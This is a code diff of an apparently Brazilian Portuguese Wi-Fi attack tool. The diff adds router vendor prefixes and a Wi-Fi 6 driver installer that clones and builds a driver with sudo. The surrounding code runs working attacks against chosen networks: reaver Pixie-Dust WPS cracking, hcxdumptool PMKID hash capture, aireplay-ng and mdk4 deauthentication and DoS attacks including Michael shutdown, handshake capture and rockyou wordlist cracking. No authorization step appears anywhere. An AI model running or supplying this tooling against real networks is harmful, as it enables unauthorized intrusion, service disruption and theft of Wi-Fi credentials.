@@ -30,7 +30,8 @@ OUI_DB = {
     "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
     "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "D0:D3:E0": "Cisco",
     "00:0C:42": "MikroTik", "E8:48:B8": "MikroTik", "48:8F:5A": "MikroTik", "64:D1:54": "MikroTik",
-    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "FC:22:F4": "Zyxel"
+    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "00:24:D1": "D-Link",
+    "FC:22:F4": "Zyxel", "00:19:CB": "Zyxel", "D0:54:2D": "Zyxel", "A4:91:B1": "Intelbras"
 }
 
 def identify_vendor(bssid):
@@ -48,6 +49,30 @@ def analyze_vulnerabilities(vendor, essid, privacy):
     else:
         advice = "Vetor Híbrido: PMKID + Deauth Broadcast."
     return vulns, advice
+
+def fix_drivers_wifi6():
+    console.print(Panel("[bold yellow]Iniciando Diagnóstico de Drivers Wi-Fi 6...[/bold yellow]", title="WIFI 6 DOCTOR"))
+    stdout_usb, _ = run_command("lsusb")
+    chipset = None
+    if "8852" in stdout_usb: chipset = "RTL8852AU"
+    elif "8832" in stdout_usb: chipset = "RTL8832AU"
+    elif "7921" in stdout_usb: chipset = "MT7921AU"
+    if not chipset:
+        console.print("[bold red]Nenhum chipset Wi-Fi 6 conhecido detectado via USB.[/bold red]")
+        console.print("Dica: Verifique se a placa está bem conectada ou use outra porta USB 3.0.")
+        return False
+    console.print(f"[bold green]Chipset Detectado: {chipset}[/bold green]")
+    if Confirm.ask(f"Deseja tentar instalar drivers automáticos para {chipset}?"):
+        with console.status("[bold cyan]Instalando componentes táticos...", spinner="dots"):
+            if "RTL" in chipset:
+                run_command("apt update && apt install -y build-essential git dkms raspberrypi-kernel-headers", sudo=True)
+                run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/rtl8852au", sudo=True)
+                run_command("cd /tmp/rtl8852au && make && make install", sudo=True)
+            elif "MT" in chipset:
+                run_command("apt update && apt install -y firmware-libertas", sudo=True)
+        console.print("[bold green]Instalação finalizada. Reinicie o sistema.[/bold green]")
+        return True
+    return False
 
 def print_banner():
     banner = """
@@ -169,36 +194,32 @@ def scan_networks(monitor_interface):
     target = networks[choice - 1]
     _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
     console.print(Panel(f"INTELIGÊNCIA: {advice}", title="ANÁLISE SUPREMA", border_style="green"))
-    console.print("[1] Deauth Magistrado\n[2] PMKID Stealth\n[3] WPS Pixie-Dust (Grão-Mestre)")
+    console.print("[1] Deauth Magistrado\n[2] PMKID Stealth\n[3] WPS Pixie-Dust")
     atk_c = Prompt.ask("Vetor", choices=["1", "2", "3"], default="2")
     target['attack_type'] = 'wps' if atk_c == '3' else ('pmkid' if atk_c == '2' else 'handshake')
     return target
 
 def capture_wps(monitor_interface, bssid, channel):
     console.print(Panel(f"Iniciando Incursão WPS Pixie-Dust...", border_style="magenta"))
-    # Tenta usar reaver com ataque Pixie-Dust (-K 1)
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
     try:
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
         if "WPS PIN" in result.stdout or "WPA PSK" in result.stdout:
-            console.print("[bold green] [✔] SUCESSO ABSOLUTO! PIN/Senha extraídos via Pixie-Dust.[/bold green]")
-            console.print(result.stdout)
+            console.print("[bold green] [✔] SUCESSO![/bold green]")
             return True
     except: pass
-    console.print("[bold red] [X] Alvo imune a Pixie-Dust (WPS bloqueado ou protegido).[/bold red]")
     return False
 
 def capture_pmkid(monitor_interface, bssid, channel, output_file):
-    console.print(Panel(f"Iniciando Extração PMKID (Sessão Prolongada)...", border_style="red"))
+    console.print(Panel(f"Iniciando Extração PMKID...", border_style="red"))
     pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     filtro = "alvo_filtro.txt"
     with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
-    # Aumentado tempo para 60s e adicionado injeção mais frequente
     dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
     with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
-        task = progress.add_task("Varredura profunda de RSNIE...", total=60)
+        task = progress.add_task("Varredura profunda...", total=60)
         proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         for _ in range(60):
             time.sleep(1); progress.update(task, advance=1)
@@ -207,7 +228,7 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file):
     if os.path.exists(pcapng):
         run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
         if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
-            console.print("[bold green] [✔] HASH EXTRAÍDO![/bold green]"); return hashf
+            return hashf
     return None
 
 def capture_handshake(monitor_interface, bssid, channel, output_file):
@@ -218,13 +239,12 @@ def capture_handshake(monitor_interface, bssid, channel, output_file):
     dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     cap_file = f"{output_file}-01.cap"; handshake_found = False
     for attempt in range(1, 5):
-        console.print(f"\n>>> VETOR {attempt}/4")
         if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
         elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
-        elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}" # DoS de Autenticação
-        else: deauth_cmd = f"sudo mdk4 {monitor_interface} m -t {bssid}" # Michael Shutdown Attack
+        elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
+        else: deauth_cmd = f"sudo mdk4 {monitor_interface} m -t {bssid}"
         deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        with Progress(SpinnerColumn("dots"), TextColumn("[bold yellow]Monitorando... {task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
+        with Progress(SpinnerColumn("dots"), TextColumn("[bold yellow]Vigiando chaves..."), BarColumn(), TimeRemainingColumn()) as progress:
             task = progress.add_task("", total=30)
             for _ in range(30):
                 time.sleep(1); progress.update(task, advance=1)
@@ -232,17 +252,18 @@ def capture_handshake(monitor_interface, bssid, channel, output_file):
                     stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                     if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
         deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
-        if handshake_found: console.print(f"\n[bold green] [✔] CAPTURADO![/bold green]"); break
+        if handshake_found: break
     dump_proc.terminate(); return cap_file if handshake_found else None
 
 def main():
     if os.geteuid() != 0: return
     while True:
         os.system("clear"); print_banner()
-        console.print("\n[bold cyan]1.[/bold cyan] Incursão Grão-Mestre\n[bold cyan]2.[/bold cyan] Info\n[bold cyan]3.[/bold cyan] Sair")
-        opcao = Prompt.ask("\n[bold green]Ação[/bold green]", choices=["1", "2", "3"])
-        if opcao == '2': show_manual(); continue
-        elif opcao == '3': return
+        console.print("\n[bold cyan]1.[/bold cyan] Incursão Grão-Mestre\n[bold cyan]2.[/bold cyan] Diagnóstico de Placa Wi-Fi 6\n[bold cyan]3.[/bold cyan] Info\n[bold cyan]4.[/bold cyan] Sair")
+        opcao = Prompt.ask("\n[bold green]Ação[/bold green]", choices=["1", "2", "3", "4"])
+        if opcao == '3': show_manual(); continue
+        elif opcao == '4': return
+        elif opcao == '2': fix_drivers_wifi6(); Prompt.ask("\nENTER para voltar..."); continue
         elif opcao == '1': break
     if not check_aircrack_ng(): return
     interface = get_wifi_interface()
@@ -262,7 +283,7 @@ def main():
         if not cap_file: console.print(Panel("[bold red]Alvo resistiu.[/bold red]")); return
         wordlist = Prompt.ask("\nWordlist", default="/usr/share/wordlists/rockyou.txt")
         crack_hash(cap_file, wordlist, target['bssid'])
-    except KeyboardInterrupt: console.print("\n[bold red]>>> ABORTO.[/bold red]")
+    except KeyboardInterrupt: pass
     finally: set_managed_mode(monitor_interface)
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
